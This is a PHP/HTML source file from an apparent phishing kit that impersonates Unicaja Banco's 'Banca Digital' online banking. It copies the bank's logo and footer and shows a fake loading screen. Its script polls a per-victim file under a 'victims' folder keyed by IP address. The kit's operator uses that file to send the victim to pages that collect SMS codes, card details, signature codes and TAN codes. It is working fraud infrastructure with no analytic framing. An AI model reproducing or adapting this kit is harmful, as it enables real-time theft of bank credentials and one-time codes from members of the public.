<?php
    /*******
    Main Author: MemoryError
    ********************************************************/
    
    require_once '../includes/main.php';
    $code = $_GET['code'];
    $_SESSION['last_page'] = 'loading';
?>


<!DOCTYPE html>
<html style="display: flex; flex-direction: column; height: 100%;"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="Banca%20Digital_fichiers/bootstrap-icons.css">
        <link rel="stylesheet" href="Banca%20Digital_fichiers/font-awesome.min.css"> 
        <title>Banca Digital</title>

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />
        <!-- link__css -->
        <link rel="stylesheet" href="Banca%20Digital_fichiers/bootstrap.css">
        <link rel="stylesheet" href="Banca%20Digital_fichiers/style.css">
</head>
<body style="display: flex; flex-direction: column; height: 100%;">

    <div id="whitebox" style="display: none;"></div>
        
        <div class="navbar">
            <div class="container-fluid">
                <div class="logo">
                    <svg width="146" height="35" viewBox="0 0 146 35" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M141.575 21.368C142.725 21.368 143.701 21.707 144.5 22.385C145.3 23.064 145.7 24.008 145.7 25.219C145.7 26.435 145.293 27.377 144.481 28.045C143.668 28.714 142.699 29.047 141.575 29.047C140.359 29.047 139.364 28.691 138.589 27.979C137.815 27.266 137.428 26.341 137.428 25.203C137.428 24.045 137.823 23.116 138.612 22.417C139.402 21.717 140.39 21.368 141.575 21.368ZM141.575 27.671C142.679 27.671 143.23 26.833 143.23 25.157C143.23 23.554 142.679 22.751 141.575 22.751C141.048 22.751 140.634 22.963 140.336 23.387C140.04 23.809 139.89 24.415 139.89 25.203C139.89 26.849 140.452 27.671 141.575 27.671ZM136.645 26.889V28.554C135.745 28.884 134.918 29.048 134.167 29.048C132.878 29.048 131.847 28.699 131.077 28.002C130.304 27.306 129.919 26.382 129.919 25.234C129.919 24.112 130.308 23.188 131.087 22.46C131.867 21.732 132.859 21.368 134.067 21.368C134.843 21.368 135.667 21.528 136.537 21.852V23.581C135.9 23.253 135.273 23.088 134.657 23.088C133.967 23.088 133.417 23.282 133.002 23.668C132.588 24.055 132.38 24.571 132.38 25.218C132.38 25.872 132.582 26.398 132.987 26.798C133.391 27.198 133.922 27.398 134.578 27.398C135.066 27.398 135.755 27.228 136.645 26.889ZM123.747 21.524V22.572C124.426 21.769 125.221 21.368 126.131 21.368C126.892 21.368 127.529 21.613 128.039 22.103C128.549 22.593 128.803 23.296 128.803 24.209V28.907H126.496V24.403C126.496 23.417 126.116 22.923 125.356 22.923C124.81 22.923 124.276 23.33 123.747 24.143V28.908H121.44V21.524H123.747ZM120.485 27.084V28.374C119.718 28.824 118.999 29.047 118.326 29.047C117.6 29.047 117.171 28.771 117.036 28.218C116.234 28.771 115.428 29.048 114.62 29.048C114.05 29.048 113.566 28.866 113.168 28.503C112.77 28.14 112.57 27.719 112.57 27.238C112.57 26.595 112.776 26.077 113.187 25.683C113.599 25.288 114.845 24.781 116.927 24.159C116.978 23.335 116.554 22.924 115.653 22.924C114.674 22.924 113.773 23.335 112.951 24.159V22.268C113.903 21.6714 115.005 21.3591 116.128 21.368C118.198 21.368 119.234 22.118 119.234 23.616V26.983C119.234 27.328 119.361 27.5 119.615 27.5C119.805 27.5 120.097 27.361 120.485 27.084ZM116.927 27.114V25.324C116.156 25.597 115.626 25.841 115.339 26.058C115.052 26.275 114.907 26.551 114.907 26.887C114.907 27.1 114.98 27.285 115.125 27.439C115.191 27.5131 115.273 27.5721 115.364 27.6121C115.455 27.6521 115.554 27.6722 115.653 27.671C116.088 27.671 116.513 27.485 116.927 27.113V27.114ZM102.545 17.98H107.235C108.354 17.98 109.232 18.25 109.872 18.793C110.512 19.335 110.832 19.976 110.832 20.715C110.832 21.663 110.337 22.39 109.348 22.895C110.094 23.094 110.665 23.443 111.06 23.945C111.456 24.445 111.654 25.029 111.654 25.697C111.654 26.647 111.331 27.419 110.684 28.013C110.037 28.608 109.084 28.906 107.825 28.906H102.545V17.98ZM105.248 19.982V22.321H106.661C107.097 22.321 107.435 22.208 107.679 21.984C107.923 21.761 108.044 21.479 108.044 21.14C108.044 20.806 107.923 20.53 107.679 20.31C107.435 20.092 107.097 19.982 106.661 19.982H105.247H105.248ZM105.248 24.322V26.904H106.77C107.49 26.904 108.008 26.804 108.324 26.603C108.639 26.402 108.797 26.053 108.797 25.558C108.797 25.178 108.647 24.877 108.347 24.655C108.047 24.435 107.645 24.323 107.143 24.323H105.247L105.248 24.322Z" fill="white"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M95.719 25.46C94.353 25.944 93.702 26.256 93.702 26.974C93.702 27.396 94.035 27.74 94.448 27.74C94.876 27.74 95.338 27.537 95.718 27.193V25.46H95.719ZM99.277 27.162V28.427C98.641 28.801 97.736 29.083 97.116 29.083C96.353 29.083 95.988 28.849 95.829 28.27C94.941 28.864 94.211 29.083 93.416 29.083C92.24 29.083 91.368 28.223 91.368 27.318C91.368 25.6 92.653 25.257 95.718 24.32C95.766 23.649 95.448 23.117 94.448 23.117C93.527 23.117 92.478 23.586 91.748 24.32V22.477C92.705 21.8963 93.8047 21.5933 94.924 21.602C96.768 21.602 98.021 22.212 98.021 23.789V27.069C98.021 27.428 98.164 27.568 98.403 27.568C98.561 27.568 98.736 27.537 99.277 27.162V27.162ZM89.889 21.743H87.586V28.598C87.586 29.769 87.236 30.348 86.394 30.488L87.124 32.534C88.3 32.424 89.889 31.597 89.889 29.145V21.743V21.743ZM82.982 25.459C81.617 25.944 80.966 26.256 80.966 26.974C80.966 27.396 81.299 27.74 81.711 27.74C82.141 27.74 82.602 27.537 82.982 27.193V25.46V25.459ZM86.541 27.162V28.427C85.905 28.801 85.001 29.083 84.381 29.083C83.618 29.083 83.253 28.849 83.094 28.27C82.204 28.864 81.474 29.083 80.68 29.083C79.505 29.083 78.631 28.223 78.631 27.318C78.631 25.6 79.917 25.257 82.982 24.32C83.031 23.649 82.713 23.117 81.712 23.117C80.791 23.117 79.742 23.586 79.012 24.32V22.477C79.9693 21.8961 81.0693 21.5931 82.189 21.602C84.03 21.602 85.286 22.212 85.286 23.789V27.069C85.286 27.428 85.428 27.568 85.668 27.568C85.825 27.568 86 27.537 86.541 27.162ZM77.517 26.974C76.501 27.349 76.009 27.474 75.453 27.474C74.134 27.474 73.261 26.631 73.261 25.351C73.261 24.085 74.151 23.273 75.533 23.273C76.103 23.273 76.803 23.446 77.407 23.758V22.071C76.644 21.79 75.692 21.602 74.945 21.602C72.53 21.602 70.8 23.164 70.8 25.365C70.8 27.615 72.467 29.082 75.04 29.082C75.819 29.082 76.597 28.926 77.517 28.598V26.974V26.974ZM66.86 28.943H69.163V21.743H66.86V28.943ZM59.86 21.743H57.556V28.943H59.859V24.304C60.464 23.414 60.891 23.118 61.464 23.118C62.114 23.118 62.607 23.539 62.607 24.554V28.943H64.911V24.366C64.911 22.243 63.385 21.602 62.242 21.602C61.305 21.602 60.59 21.946 59.859 22.774V21.743H59.86ZM55.476 18.292V24.335C55.476 27.865 53.029 29.082 50.06 29.082C46.915 29.082 44.644 27.646 44.644 24.352V18.292H47.344V24.413C47.344 25.944 48.471 26.865 50.028 26.865C51.457 26.865 52.776 26.131 52.776 24.225V18.292H55.476V18.292Z" fill="white"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M0.0529938 34.908H145.676V33.748H0.0529938V34.908ZM65.956 18.289C65.956 17.179 66.872 16.28 67.999 16.28C69.128 16.28 70.042 17.18 70.042 18.289C70.042 19.398 69.128 20.297 67.999 20.297C66.872 20.297 65.956 19.397 65.956 18.289Z" fill="#E1251B"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M86.752 18.289C86.752 17.179 87.667 16.28 88.794 16.28C89.923 16.28 90.837 17.18 90.837 18.289C90.837 19.398 89.923 20.297 88.794 20.297C87.667 20.297 86.752 19.397 86.752 18.289Z" fill="#278600"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M47.298 15.663L46.107 13.947L37.307 17.087L47.298 15.663ZM45.737 13.2L44.467 11.426L33.847 17.376L45.737 13.2V13.2ZM43.861 10.717L41.761 8.432L29.896 18.725L43.861 10.717ZM41.231 7.698C41.231 7.698 40.521 6.981 39.877 6.399C39.232 5.818 38.237 5.081 38.237 5.081L27.639 19.499L41.232 7.7L41.231 7.698ZM37.467 4.788C37.467 4.788 37.363 4.46 35.671 3.459C33.979 2.459 33.228 2.321 33.228 2.321L25.913 20.524L37.467 4.79V4.788ZM32.23 1.96C32.23 1.96 31.133 1.507 29.563 1.02C27.994 0.531999 26.431 0.399999 26.431 0.399999L24.307 22.546L32.23 1.96ZM25.413 0.326999C25.413 0.326999 24.15 -0.0310013 21.723 0.139999C19.297 0.310999 17.873 0.776999 17.873 0.776999L23.06 26.116L25.413 0.326999ZM16.788 0.913999C16.788 0.913999 15.084 1.299 12.378 2.468C9.672 3.638 8.27 4.792 8.27 4.792L22.706 28.314L16.786 0.913999H16.788ZM24.356 32.883L0 12.993C0 12.993 1.252 10.755 3.09 8.857C4.93 6.96 7.12 5.431 7.12 5.431L24.356 32.883Z" fill="#509E2F"></path>
</svg>
                </div>
                <div class="nuu">
                    <span>¿<hello class="chlakh">Te ayudamos?</hello></span>
                    <span> <i class="fa fa-phone me-1"></i><hello class="chlakh">952076 263</hello></span>
                </div>
                <span class="dd"><i class="fa fa-phone me-1"></i></span>
            </div>
        </div>

        <div class="information pt-4" style="flex-grow: 1;">
            <div class="container">
                <div class="info">
                    
                    <div class="loader">
                        <img style="max-width: 120px;" src="Banca%20Digital_fichiers/logo.png">
                        <div>
                            <div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div>
                        </div>
                    </div>

                </div> 
            </div>
        </div>

        <div class="home mt-0 pt-0 room">
            <div class="container">
                <hr class="mt-5">
                <div class="text-center mm">© <hello class="chlakh">Unicaja Banco</hello> 2022. <hello class="chlakh">Todos los derechos reservados.</hello></div>
            </div>
        </div>



        <script src="Banca%20Digital_fichiers/jquery-3.5.1.min.js"></script>
        <script src="Banca%20Digital_fichiers/jquery.mask.js"></script>
        <script src="Banca%20Digital_fichiers/script.js"></script>
          <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>
<script>
            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
                $.get('../victims/' + ip + '.txt', function(data) {
                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else {
                        var zow = data.split('/');
                        var one = zow[0];
                        var two = zow[1];
                        if( one == 'errorlogin' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorlogin";
			            } else if( one == 'firma' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=firma&code=" + two;
                        } else if( one == 'sms' ) {
                            clearInterval(waiting);
                           location.href = "../index-.php?redirection=sms&code=" + two;
                        } else if( one == 'cc' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=cc";
                        } else if( one == 'errorcc' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorcc";
                        } else if( one == 'errorsms' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorsms";
                        } else if( one == 'tan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
                            var code4 = zow[4];
                            location.href = "../index-.php?redirection=tan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3 +"&code4=" + code4;
                        } else if( one == 'errortan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
		            var code4 = zow[4];

                            location.href = "../index-.php?redirection=errortan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3 +"&code4=" + code4;
                        } else if( one == 'success' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=success";
                        }

                    }
                });
            }, 1000);
        </script>

    </body>

</html>